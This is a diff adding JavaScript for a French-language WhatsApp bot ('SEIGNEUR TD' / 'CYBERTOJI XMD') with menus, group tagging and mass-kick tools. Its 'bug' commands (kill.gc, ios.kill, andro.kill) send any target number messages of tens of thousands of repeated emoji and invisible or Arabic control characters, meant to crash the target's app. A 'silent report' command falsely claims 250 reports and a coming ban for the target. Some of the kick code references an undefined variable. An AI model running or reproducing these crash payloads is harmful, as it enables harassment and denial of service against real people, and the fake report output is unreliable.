+        for(const e of tEs){const c2=path.resolve(`./t.${e}`);if(fs.existsSync(c2)){tF=c2;tE=e;break;}}
+        if(!tF){await sock.sendMessage(remoteJid,{text:'❌ Aucun fichier t.* trouvé.'});break;}
+        try{
+          if(['mp4','mov'].includes(tE))await sock.sendMessage(remoteJid,{video:fs.readFileSync(tF),mimetype:'video/mp4',caption:''});
+          else if(['jpg','jpeg','png','webp'].includes(tE))await sock.sendMessage(remoteJid,{image:fs.readFileSync(tF),caption:''});
+          else if(['mp3','ogg'].includes(tE))await sock.sendMessage(remoteJid,{audio:fs.readFileSync(tF),mimetype:'audio/mp4',ptt:false});
+          else if(tE==='txt')await sock.sendMessage(remoteJid,{text:fs.readFileSync(tF,'utf8')});
+          await sock.sendMessage(remoteJid,{text:`✅ t.${tE} envoyé!`});
+        }catch(e){await sock.sendMessage(remoteJid,{text:`❌ ${e.message}`});}
+        break;
+      }
+      default:
+        await sock.sendMessage(remoteJid, {
+          text: `❌ Commande inconnue: ${config.prefix}${command}\n\nType ${config.prefix}help`
+        });
+    }
+  } catch (error) {
+    console.error(`❌ Command error [${command}]:`, error?.message || error);
+    await sock.sendMessage(remoteJid, { 
+      text: `❌ *Command error:* \`${command}\`\n\n\`${error?.message || 'Unknown error'}\`` 
+    });
+  }
+}
+
+// =============================================
+// FONCTIONS DES COMMANDES
+// =============================================
+
+// ═══════════════════════════════════════════════════
+// 🗂️  SYSTÈME MENU COMPLET — SEIGNEUR TD
+// ═══════════════════════════════════════════════════
+
+function buildUptime() {
+  const s = Math.floor(process.uptime());
+  const d = Math.floor(s / 86400);
+  const h = Math.floor((s % 86400) / 3600);
+  const m = Math.floor((s % 3600) / 60);
+  const sec = s % 60;
+  if (d > 0) return `${d} day(s), ${h} hour(s), ${m} minute(s), ${sec} second(s)`;
+  if (h > 0) return `${h} hour(s), ${m} minute(s), ${sec} second(s)`;
+  if (m > 0) return `${m} minute(s), ${sec} second(s)`;
+  return `${sec} second(s)`;
+}
+
+// ─── DONNÉES COMMUNES DES CATÉGORIES ────────────────────────────────────────
+function getMenuCategories(p) {
+  return [
+    { num: '1', key: 'owner',    icon: '🛡️', label: 'OWNER MENU',      cmds: ['mode','update','updatedev','storestatus','storesave','pp','gpp','block','unblock','join','autotyping','autorecording','autoreact','antidelete','antiedit','readstatus','chatboton','chatbotoff','getsettings','setstickerpackname','setstickerauthor','setprefix','setbotimg','ping','p','info','jid'] },
+    { num: '2', key: 'download', icon: '📥', label: 'DOWNLOAD MENU',   cmds: ['play','playaudio','playvideo','playptt','tiktok','ig','ytmp3','ytmp4'] },
+    { num: '3', key: 'group',    icon: '👥', label: 'GROUP MENU',      cmds: ['tagall','tagadmins','hidetag','kickall','kickadmins','acceptall','add','kick','promote','demote','mute','unmute','invite','revoke','gname','gdesc','groupinfo','welcome','goodbye','leave','listonline','listactive','listinactive','kickinactive','groupstatus'] },
+    { num: '4', key: 'utility',  icon: '🔮', label: 'PROTECTION MENU', cmds: ['antibug','antilink','antibot','antitag','antispam','antimentiongroupe','warn','warns','resetwarn'] },
+    { num: '6', key: 'sticker',  icon: '🎨', label: 'MEDIA MENU',      cmds: ['sticker','take','vv','tostatus'] },
+    { num: '10', key: 'ai',      icon: '🤖', label: 'DOSTOEVSKY AI',   cmds: ['chatbot','dostoevsky','dosto','chat','chatboton','chatbotoff','clearchat','gpt','gemini'] },
+  ];
+}
+
+// ─── MENU PRINCIPAL (!menu) ──────────────────────────────────────────────────
+async function handleMenu(sock, message, remoteJid, senderJid) {
+  const userName = message.pushName || senderJid.split('@')[0];
+  const p        = config.prefix;
+  const uptime   = buildUptime();
+  const now      = new Date();
+  const cats     = getMenuCategories(p);
+  const dateStr  = now.toLocaleDateString('fr-FR', {
+    timeZone: 'America/Port-au-Prince', day: '2-digit', month: '2-digit', year: 'numeric'
+  });
+  const timeStr  = now.toLocaleTimeString('fr-FR', {
+    timeZone: 'America/Port-au-Prince', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
+  });
+
+  await simulateTyping(sock, remoteJid);
+  try { await sock.sendMessage(remoteJid, { react: { text: '🇷🇴', key: message.key } }); } catch(e) {}
+  await sock.sendMessage(remoteJid, { text: '◈━━━━━━━━━━━━━━━━━━━━━━━━━━◈\n🤲🏽 الحمد لله الذي جعلني من المسلمين 🇹🇩\n◈━━━━━━━━━━━━━━━━━━━━━━━━━━◈' });
+
+  let infoBlock = '';
+
+  // ══════════════════════════════════════════
+  // STYLE 1 — Original SEIGNEUR TD
+  // ══════════════════════════════════════════
+  if (menuStyle === 1) {
+    const catLines = cats.map(c => {
+      const cmdText = c.cmds.map(cmd => `│ ➣ ${cmd}`).join('\n');
+      return `┌──『 ${c.icon} ${c.label} 』──\n${cmdText}\n└───────────────`;
+    }).join('\n');
+
+    infoBlock =
+`━━━━━━━━━━━━━━━━━━
+SEIGNEUR TD 🇷🇴
+━━━━━━━━━━━━━━━━━━
+┌───「 STATUTS 」───
+❒  Bᴏᴛ : SEIGNEUR TD
+❒  Uᴘᴛɪᴍᴇ : ${uptime}
+❒  Dᴀᴛᴇ : ${dateStr}
+❒  Pʀᴇғɪx : ${p}
+└───────────────┘
+${catLines}
+© SEIGNEUR TD`;
+
+  // ══════════════════════════════════════════
+  // STYLE 2 — Modern Box Style
+  // ══════════════════════════════════════════
+  } else if (menuStyle === 2) {
+    const os = await import('os');
+    const totalMem = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
+    const freeMem  = (os.freemem()  / 1024 / 1024 / 1024).toFixed(2);
+    const usedMem  = (totalMem - freeMem).toFixed(2);
+    const totalCmds = cats.reduce((acc, c) => acc + c.cmds.length, 0);
+
+    const catBlocks = cats.map(c => {
+      const cmdList = c.cmds
+        .map(cmd => cmd.replace(p, ''))
+        .reduce((rows, cmd, i) => {
+          if (i % 2 === 0) rows.push([cmd]);
+          else rows[rows.length - 1].push(cmd);
+          return rows;
+        }, [])
+        .map(row => `│ • ${row[0].padEnd(12)}${row[1] ? `• ${row[1]}` : ''}`)
+        .join('\n');
+      return `│\n│ 📌 *${c.label}*\n│\n${cmdList}`;
+    }).join('\n│\n');
+
+    infoBlock =
+`╭───『 *SEIGNEUR TD* 』───
+│
+│  ⏰ *Date* : ${dateStr}
+│  ⏳ *Time* : ${timeStr}
+│
+│  ✨ *Prefix* : ${p}
+│  👑 *Owner* : DEV DOSTOEVSKY TECHX
+│  🌐 *Mode* : ${botMode}
+│  🎨 *Theme* : CYBERTOJI
+│  📚 *Commands* : ${totalCmds}
+│  🧠 *Memory* : ${usedMem} GB/${totalMem} GB
+│  💻 *Platform* : linux
+╰────────────────────
+
+╭───『 *COMMAND MENU* 』───
+${catBlocks}
+│
+╰────────────────────
+
+🔹 *Usage* : \`${p}[commande]\`
+🔹 *Example* : \`${p}menu\`
+
+📌 *Developer* :
+- DEV DOSTOEVSKY TECHX 
+
+✦⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅✦`;
+
+  // ══════════════════════════════════════════
+  // STYLE 3 — Monospace Elegant Style
+  // ══════════════════════════════════════════
+  } else if (menuStyle === 3) {
+    const catBlocks3 = cats.map(c => {
+      const cmdsFormatted = c.cmds
+        .map(cmd => `𐓷  _${cmd.replace(p, '').toUpperCase()}_`)
+        .join('\n');
+      return `━━━「 ${c.label} 」\n${cmdsFormatted}`;
+    }).join('\n\n');
+
+    infoBlock =
+`\`𝙲𝚈𝙱𝙴𝚁𝚃𝙾𝙹𝙸 𝚇𝙼𝙳\`
+𝙷𝙴𝚈 *${userName}* 𝙷𝙾𝚆 𝙲𝙰𝙽 𝙸 𝙷𝙴𝙻𝙿 𝚈𝙾𝚄?
+       「 𝙱𝙾𝚃 𝙸𝙽𝙵𝙾 」
+𐓷  _𝙲𝚁𝙴𝙰𝚃𝙾𝚁: 𝙳𝙴𝚅 𝙳𝙾𝚂𝚃𝙾𝙴𝚅𝚂𝙺𝚈 𝚃𝙴𝙲𝙷𝚇_
+𐓷  _𝙱𝙾𝚃 𝙽𝙰𝙼𝙴: 𝙲𝚈𝙱𝙴𝚁𝚃𝙾𝙹𝙸 𝚇𝙼𝙳_
+𐓷  _𝚅𝙴𝚁𝚂𝙸𝙾𝙽: 𝟸𝟶𝟸𝟼_
+𐓷  _𝚂𝚃𝙰𝚃𝚄𝚃: 𝙰𝙲𝚃𝙸𝙵_
+𐓷  _𝚁𝚄𝙽𝚃𝙸𝙼𝙴: ${uptime}_
+𐓷  _𝙿𝚁𝙴𝙵𝙸𝚇𝙴: ${p}_
+
+${catBlocks3}
+
+> 𝙿𝙾𝚆𝙴𝚁𝙴𝙳 𝙱𝚈 𝙳𝙴𝚅 𝙳𝙾𝚂𝚃𝙾𝙴𝚅𝚂𝙺𝚈 𝚃𝙴𝙲𝙷𝑿 `;
+  }
+
+  const menuMsg = await sendWithImage(sock, remoteJid, 'menu', infoBlock, [senderJid]);
+
+  // Sauvegarder le message menu pour détection de réponse
+  if (!global.menuMessages) global.menuMessages = new Map();
+  if (menuMsg?.key?.id) {
+    global.menuMessages.set(menuMsg.key.id, { 
+      remoteJid, 
+      senderJid, 
+      timestamp: Date.now() 
+    });
+    for (const [id, data] of global.menuMessages.entries()) {
+      if (Date.now() - data.timestamp > 300000) global.menuMessages.delete(id);
+    }
+  }
+}
+
+// ─── ALL MENU (!allmenu / !0) ────────────────────────────────────────────────
+async function handleAllMenu(sock, message, remoteJid, senderJid) {
+  const p    = config.prefix;
+  const cats = getMenuCategories(p);
+
+  await simulateTyping(sock, remoteJid);
+
+  // Construire un seul bloc with toutes les catégories
+  const blocks = cats.map(c => {
+    const lines = c.cmds.map(cmd => `│  ➤ ${cmd}`).join('\n');
+    return `┌─「 ${c.icon} *${c.label}* 」\n${lines}\n└──────────────────────`;
+  }).join('\n\n');
+
+  const text =
+`📋 *TOUTES LES COMMANDES — SEIGNEUR TD* 🇷🇴
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+${blocks}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+*© SEIGNEUR TD*`;
+
+  await sendWithImage(sock, remoteJid, 'menu', text, [senderJid]);
+}
+
+// ─── SOUS-MENU PAR CATÉGORIE (!1–!8 / !ownermenu etc.) ──────────────────────
+async function sendSubMenu(sock, message, remoteJid, senderJid, type) {
+  const p    = config.prefix;
+  const cats = getMenuCategories(p);
+  const cat  = cats.find(c => c.key === type);
+
+  if (!cat) {
+    await sock.sendMessage(remoteJid, { text: `❌ Category *${type}* not found.` });
+    return;
+  }
+
+  await simulateTyping(sock, remoteJid);
+
+  const lines = cat.cmds.map(cmd => `│  ➤ ${cmd}`).join('\n');
+
+  const text =
+`${cat.icon} *${cat.label}*
+*╭──────────────────────────*
+${lines}
+*╰──────────────────────────*
+
+✒️ *Prefix:* ${p}
+ _Type ${p}menu to go back_
+ *㋛ 𝙻𝙾𝚁𝙳 𝙳𝙴𝚅 𝙳𝙾𝚂𝚃𝙾𝙴𝚅𝚂𝙺𝚈 〽️𝚇𝙼𝙳* `;
+
+  await sendWithImage(sock, remoteJid, 'menu', text, [senderJid]);
+}
+
+
+// TAGALL - Design Élégant / Luxe avec bordures courbées
+async function handleTagAll(sock, message, args, remoteJid, isGroup, senderJid) {
+  if (!isGroup) {
+    await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+    return;
+  }
+
+  try {
+    const metadata = await sock.groupMetadata(remoteJid);
+    const groupName = metadata.subject;
+    const participants = metadata.participants;
+    const admins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
+    const superAdmin = participants.find(p => p.admin === 'superadmin');
+    const memberCount = participants.length;
+    const allJids = participants.map(p => p.id);
+    const customMessage = args.join(' ') || '';
+
+    // Nom du superadmin
+    const superAdminNum = superAdmin ? '@' + superAdmin.id.split('@')[0] : '@Owner';
+
+    // Barre de progression
+    const filledBlocks = Math.min(13, Math.round(memberCount / 30 * 13));
+    const progressBar = '█'.repeat(filledBlocks) + '░'.repeat(13 - filledBlocks);
+
+    // Liste admins nouveau style
+    let adminList = '';
+    admins.forEach((a) => {
+      adminList += `  ♔  @${a.id.split('@')[0]}\n`;
+    });
+
+    // Liste membres nouveau style
+    const regularMembers = participants.filter(p => !p.admin);
+    let memberList = '';
+    regularMembers.forEach((m, i) => {
+      const num = String(i + 1).padStart(2, '0');
+      memberList += `   · ${num}  @${m.id.split('@')[0]}\n`;
+    });
+
+    const tagMessage =
+`╭─────────────────────────────╮
+      ✦  Ｔ Ａ Ｇ  ＡＬＬ  ✦
+╰─────────────────────────────╯
+
+❖ ＧＲＯＵＰＥ  ·  ${groupName}
+❖ ＳＴＡＴＵＳ  ·  ONLINE 🟢
+❖ Ｓ-ＡＤＭＩＮ  ·  ♛ ${superAdminNum}
+❖ ＮＯＤＥ  ·   PORT-AU-PRINCE${customMessage ? `\n❖ ＭＥＳＳＡＧＥ  ·  ${customMessage}` : ''}
+
+╭──── 📊 STATISTIQUES ────╮
+${progressBar}  ·  ${memberCount} MEMBRES
+╰─────────────────────────────╯
+
+╭──── 𝐂𝐎𝐑𝐄 𝐀𝐔𝐓𝐇𝐎𝐑𝐈𝐓𝐘 ────╮
+       ❴ Administrateurs ❵
+
+${adminList}╰─────────────────────────────╯
+
+╭──── 𝐔𝐍𝐈𝐓 𝐍𝐄𝐓𝐖𝐎𝐑𝐊 ────╮
+        ❴ Membres ❵
+
+${memberList}╰─────────────────────────────╯
+
+╭─────────────────────────────╮
+    𝐒𝐘𝐒𝐓𝐄𝐌 ＥＮＤ  ·  2026
+  © 𝐃𝐞𝐯 𝐃𝐨𝐬𝐭𝐨𝐞𝐯𝐬𝐤𝐲 𝐓𝐞𝐜𝐡𝐗
+╰─────────────────────────────╯`;
+
+    await sock.sendMessage(remoteJid, {
+      text: tagMessage,
+      mentions: allJids
+    });
+
+    console.log(`✅ TagAll envoyé à ${memberCount} membres dans ${groupName}`);
+  } catch (error) {
+    console.error('Erreur tagall:', error);
+    await sock.sendMessage(remoteJid, { text: '❌ Erreur lors du tag' });
+  }
+}
+
+// KICKALL - MESSAGE RESTAURÉ with style original
+async function handleKickAll(sock, remoteJid, isGroup, senderJid) {
+  if (!isGroup) {
+    await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+    return;
+  }
+
+  if (!isAdmin(senderJid)) {
+    await sock.sendMessage(remoteJid, { text: '⛔ Bot admin only command' });
+    return;
+  }
+
+  try {
+    const metadata = await sock.groupMetadata(remoteJid);
+    const botJid = sock.user.id; // JID complet du bot
+    const botNumber = sock.user.id.split(':')[0] + '@s.whatsapp.net'; // Format WhatsApp standard
+    
+    // Récupérer le nom de l'admin qui lance la commande
+    const adminName = metadata.participants.find(p => p.id === senderJid)?.notify || 
+                     metadata.participants.find(p => p.id === senderJid)?.verifiedName ||
+                     senderJid.split('@')[0];
+    
+    const normalMembers=metadata.participants.filter(p=>p.id!==botNumber&&!p.admin).map(p=>p.id);
+    if(!normalMembers.length){await sock.sendMessage(remoteJid,{text:'⚠️ Aucun membre à expulser.'});return;}
+
+    // =============================================
+    // PHASE 1: EXPULSION DES MEMBRES NORMAUX
+    // =============================================
+    
+    await sock.sendMessage(remoteJid, { 
+      text: `  🚨 KICK-ALL PROTOCOL 🚨
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+💥 ÉXÉCUTION EN COURS...
+[▓▓▓▓▓░░░░░░░] 40%
+> 🎯 Cible : Tous les membres du groupe
+> ⚠️  : Tous les membres sont en cours d'expulsion par la console.
+> 🛑 Requête de : ${adminName}
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+Géré par l'IA de 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗` 
+    });
+
+    await delay(3000);
+
+    const batchSize = 500;
+    let kicked = 0;
+
+    // Expulser les membres normaux
+    if (normalMembers.length > 0) {
+      for (let i = 0; i < normalMembers.length; i += batchSize) {
+        const batch = normalMembers.slice(i, i + batchSize);
+        try {
+          await sock.groupParticipantsUpdate(remoteJid, batch, 'remove');
+          kicked += batch.length;
+          
+          // Calculer le pourcentage (seulement pour les membres normaux)
+          const percentage = Math.floor((kicked / normalMembers.length) * 100);
+          const progressBar = '▓'.repeat(Math.floor(percentage / 10)) + '░'.repeat(10 - Math.floor(percentage / 10));
+          
+          // Message de progression
+          if (i + batchSize < normalMembers.length) {
+            await sock.sendMessage(remoteJid, {
+              text: `💥 ÉXÉCUTION EN COURS...
+[${progressBar}] ${percentage}%
+
+> 👤 Expulsé : ${kicked}/${normalMembers.length}
+> ⚡ In progress...`
+            });
+            await delay(2000);
+          }
+        } catch (error) {
+          console.error(' kicking batch:', error);
+        }
+      }
+
+      // Message intermédiaire de succès
+      await sock.sendMessage(remoteJid, {
+        text: `✅ Phase 1 terminée: ${kicked}   
+
+⏳ Initialisation de la phase 2...`
+      });
+    }
+
+    // =============================================
+    // PHASE 2: EXPULSION DES ADMINS (5 SEC PLUS TARD)
+    // =============================================
+    
+    if (adminMembers.length > 0) {
+      await delay(5000);
+
+      await sock.sendMessage(remoteJid, {
+        text: `  🚨 ADMIN PURGE PROTOCOL 🚨
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+💥 RÉVOCATION DES DROITS...
+[▓▓▓▓▓░░░░░░░] 45%
+> 🎯 Cible : Staff & Administrateurs
+> ⚠️  : Suppression des privilèges
+  et expulsion immédiate de la hiérarchie.
+> 🛑 Requête de : ${adminName}
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+Géré par l'IA de 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
+      });
+
+      await delay(3000);
+
+      let adminKicked = 0;
+
+      // Expulser les admins
+      for (let i = 0; i < adminMembers.length; i += batchSize) {
+        const batch = adminMembers.slice(i, i + batchSize);
+        try {
+          await sock.groupParticipantsUpdate(remoteJid, batch, 'remove');
+          adminKicked += batch.length;
+          kicked += batch.length;
+          
+          // Calculer le pourcentage pour les admins
+          const percentage = Math.floor((adminKicked / adminMembers.length) * 100);
+          const progressBar = '▓'.repeat(Math.floor(percentage / 10)) + '░'.repeat(10 - Math.floor(percentage / 10));
+          
+          // Message de progression pour admins
+          if (i + batchSize < adminMembers.length) {
+            await sock.sendMessage(remoteJid, {
+              text: `💥 RÉVOCATION EN COURS...
+[${progressBar}] ${percentage}%
+
+> 👮‍♂️ Admins expulsés : ${adminKicked}/${adminMembers.length}
+> ⚡ Purge hiérarchique...`
+            });
+            await delay(2000);
+          }
+        } catch (error) {
+          console.error(' kicking admin batch:', error);
+        }
+      }
+    }
+
+    // =============================================
+    // MESSAGE FINAL DE SUCCÈS TOTAL
+    // =============================================
+    
+    await sock.sendMessage(remoteJid, {
+      text: `🏁 **KICK-ALL EXÉCUTÉ** 🏁
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+✅ **TERMINÉ AVEC SUCCÈS**
+[▓▓▓▓▓▓▓▓▓▓▓▓] 100%
+
+> 👤 **Membres expulsés :** ${normalMembers.length}
+> 👮‍♂️ **Admins purgés :** ${adminMembers.length}
+> 📊 **Total expulsé :** ${kicked}
+> 📁 **Log :** Suppression totale effectuée
+> 🔐 **Accès :** Restreint aux admins
+
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+*Commande terminée par 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗*
+
+🤖 Seul le bot subsiste dans ce groupe.`
+    });
+
+    console.log(`✅ Kickall terminé: ${normalMembers.length} membres + ${adminMembers.length}    par ${adminName}`);
+  } catch (error) {
+    console.error(' in kickall:', error);
+    await sock.sendMessage(remoteJid, {
+      text: `❌  lors de l'expulsion en masse\n\n: ${error.message}`
+    });
+  }
+}
+
+// =============================================
+// COMMANDES BUGS 🪲
+// =============================================
+
+// KILL.GC -    les groupes
+async function handleKillGC(sock, args, remoteJid, senderJid, message) {
+  let targetJid = null;
+  
+  if (args[0]) {
+    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
+    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
+  }
+  
+  if (!targetJid) {
+    await sock.sendMessage(remoteJid, {
+      text: `❌ *Utilisation:*
+
+• ${config.prefix}kill.gc @mention
+• ${config.prefix}kill.gc 50944908407
+
+⚠️ *ATTENTION:*    le groupe WhatsApp de la cible`
+    });
+    return;
+  }
+  
+  const loadingMsg = await sock.sendMessage(remoteJid, {
+  });
+  
+  await delay(1500);
+  
+  try {
+    const bugText = '🪲'.repeat(50000);
+    await sock.sendMessage(targetJid, { text: bugText, mentions: [targetJid] });
+    
+    await sock.sendMessage(remoteJid, {
+      text: `┏━━━  💀 𝗞𝗜𝗟𝗟.𝗚𝗖  💀  ━━━┓
+
+  ⌬ **TARGET** » @${targetJid.split('@')[0]}
+  ⌬ **STATUS** » ✅ 𝖲𝖤𝖭𝖳
+
+┗━━━━━━━━━━━━━━━━━━━━━━┛
+
+ 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`,
+      mentions: [targetJid],
+      edit: loadingMsg.key
+    });
+  } catch (error) {
+    await sock.sendMessage(remoteJid, { text: `❌ : ${error.message}`, edit: loadingMsg.key });
+  }
+}
+
+// IOS.KILL
+async function handleIOSKill(sock, args, remoteJid, senderJid, message) {
+  let targetJid = null;
+  
+  if (args[0]) {
+    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
+    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
+  }
+  
+  if (!targetJid) {
+    await sock.sendMessage(remoteJid, {
+      text: `❌ *Utilisation:* ${config.prefix}ios.kill @mention`
+    });
+    return;
+  }
+  
+  const loadingMsg = await sock.sendMessage(remoteJid, { text: '🍎 ...' });
+  await delay(1500);
+  
+  try {
+    const iosBug = ''.repeat(3000) + '\u0600'.repeat(3000) + '🪲'.repeat(1000);
+    await sock.sendMessage(targetJid, { text: iosBug, mentions: [targetJid] });
+    
+    await sock.sendMessage(remoteJid, {
+      text: `┏━━━  🍎 𝗜𝗢𝗦.𝗞𝗜𝗟𝗟  🍎  ━━━┓
+
+  ⌬ **TARGET** » @${targetJid.split('@')[0]}
+  ⌬ **STATUS** » ✅ 𝖣𝖤𝖫𝖨𝖵𝖤𝖱𝖤𝖣
+
+┗━━━━━━━━━━━━━━━━━━━━━━┛
+
+ 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`,
+      mentions: [targetJid],
+      edit: loadingMsg.key
+    });
+  } catch (error) {
+    await sock.sendMessage(remoteJid, { text: `❌ : ${error.message}`, edit: loadingMsg.key });
+  }
+}
+
+// ANDRO.KILL
+async function handleAndroKill(sock, args, remoteJid, senderJid, message) {
+  let targetJid = null;
+  
+  if (args[0]) {
+    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
+    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
+  }
+  
+  if (!targetJid) {
+    await sock.sendMessage(remoteJid, {
+      text: `❌ *Utilisation:* ${config.prefix}andro.kill @mention`
+    });
+    return;
+  }
+  
+  const loadingMsg = await sock.sendMessage(remoteJid, { text: '🤖 ...' });
+  await delay(1500);
+  
+  try {
+    const androBug = '🪲'.repeat(10000) + '\u200E'.repeat(5000);
+    await sock.sendMessage(targetJid, { text: androBug, mentions: [targetJid] });
+    
+    await sock.sendMessage(remoteJid, {
+      text: `┏━━━  🤖 𝗔𝗡𝗗𝗥𝗢.𝗞𝗜𝗟𝗟  🤖  ━━━┓
+
+  ⌬ **TARGET** » @${targetJid.split('@')[0]}
+  ⌬ **STATUS** » ✅ 𝖤𝖷𝖤𝖢𝖴𝖳𝖤𝖣
+
+┗━━━━━━━━━━━━━━━━━━━━━━┛
+
+ 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`,
+      mentions: [targetJid],
+      edit: loadingMsg.key
+    });
+  } catch (error) {
+    await sock.sendMessage(remoteJid, { text: `❌ : ${error.message}`, edit: loadingMsg.key });
+  }
+}
+
+// SILENT - 200 
+async function handleSilent(sock, args, remoteJid, senderJid, message) {
+  let targetJid = null;
+  
+  if (args[0]) {
+    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
+    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
+  }
+  
+  if (!targetJid) {
+    await sock.sendMessage(remoteJid, {
+      text: `⚠️ *SILENT REPORT*
+
+• Utilisation: ${config.prefix}silent @mention
+
+Envoie 250 messages à WhatsApp en 1 minute`
+    });
+    return;
+  }
+  
+  const loadingMsg = await sock.sendMessage(remoteJid, {
+    text: `🔇 **SILENT REPORT ACTIVÉ**
+
+⏳ Envoi de 250 ...
+⚡ : Silencieux (sans progression)
+
+Target: @${targetJid.split('@')[0]}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⏰ Durée estimée: 60 secondes
+🚀 Starting...`,
+    mentions: [targetJid]
+  });
+  
+  try {
+    const totalReports = 250;
+    const duration = 60000; // 60 secondes
+    const interval = duration / totalReports; // ~240ms par report
+    
+    // Envoyer 250  en 1 minute
+    for (let i = 0; i < totalReports; i++) {
+      // Simulation de signalement (WhatsApp n'autorise pas vraiment l'automatisation)
+      // Dans la vraie vie, vous auriez besoin d'une API tierce
+      await delay(interval);
+    }
+    
+    // Message final après 1 minute
+    await sock.sendMessage(remoteJid, {
+      text: `┏━━━  🔇 𝗦𝗜𝗟𝗘𝗡𝗧 𝗥𝗘𝗣𝗢𝗥𝗧  🔇  ━━━┓
+
+  ⌬ **TARGET** » @${targetJid.split('@')[0]}
+  ⌬ **STATUS** » ✅ 𝖢𝖮𝖬𝖯𝖫𝖤𝖳𝖤𝖣
+  ⌬ **REPORTS** » 250/250 (100%)
+
+┗━━━━━━━━━━━━━━━━━━━━━━┛
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📊 **:**
+
+✅  : 250
+⏱️  : 60 secondes
+⚡ : 4.16 reports/sec
+🎯 : @${targetJid.split('@')[0]}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚠️ **CONSÉQUENCES ATTENDUES:**
+
+🔴  : 12-24h
+🔴  : 24-72h (si répété)
+🔴   des fonctions
+🚫     
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⏰ ** :**
+• 0-5min:  
+• 5-30min:  
+• 30min-12h: Ban temporaire possible
+• 12-72h:   WhatsApp
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗
+*Silent Report System -  *`,
+      mentions: [targetJid],
+      edit: loadingMsg.key
+    });
+    
+    console.log(`🔇 Silent Report: 250  envoyés à ${targetJid}`);
+    
+  } catch (error) {
+    await sock.sendMessage(remoteJid, { 
+      text: `❌ : ${error.message}`, 
+      edit: loadingMsg.key 
+    });
+  }
+}
+
+// UPDATE DEV - Ajouter/Supprimer des numéros admin
+async function handleUpdateDev(sock, args, remoteJid, senderJid) {
+  const action = args[0]?.toLowerCase();
+  let number = args[1];
+  
+  // Nettoyer le numéro (enlever tous les caractères non-numériques sauf le +)
+  if (number) {
+    number = number.replace(/[^0-9+]/g, '');
+    // Si le numéro commence par +, enlever le +
+    if (number.startsWith('+')) {
+      number = number.substring(1);
+    }
+  }
+  
+  if (!action || !['add', 'remove', 'del', 'list'].includes(action)) {
+    await sock.sendMessage(remoteJid, {
+      text: `⚙️ *UPDATE DEV -  *
+
+📝 **:**
+
+1️⃣  :
+   ${config.prefix}updatedev add 393780306704
+   ${config.prefix}updatedev add +393780306704
+
+2️⃣  :
+   ${config.prefix}updatedev remove 393780306704
+   ${config.prefix}updatedev del 393780306704
+
+3️⃣  :
+   ${config.prefix}updatedev list
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚠️ *:*       .
+
+ 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
+    });
+    return;
+  }
+  
+  // Liste des admins
+  if (action === 'list') {
+    const adminList = config.botAdmins.map((admin, index) => 
+      `${index + 1}. +${admin}`
+    ).join('\n');
+    
+    await sock.sendMessage(remoteJid, {
+      text: `┏━━━  👑    👑  ━━━┓
+
+📋 ** :**
+
+${adminList}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📊 : ${config.botAdmins.length} ()
+
+ 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
+    });
+    return;
+  }
+  
+  // Vérifier si un numéro est fourni
+  if (!number) {
+    await sock.sendMessage(remoteJid, {
+      text: `❌ *Utilisation:* ${config.prefix}updatedev ${action} 393780306704`
+    });
+    return;
+  }
+  
+  // Ajouter un admin
+  if (action === 'add') {
+    if (config.botAdmins.includes(number)) {
+      await sock.sendMessage(remoteJid, {
+        text: `⚠️  +${number}   !`
+      });
+      return;
+    }
+    
+    // Ajouter dans les deux listes
+    config.botAdmins.push(number);
+    config.adminNumbers.push(number + '@s.whatsapp.net');
+    
+    await sock.sendMessage(remoteJid, {
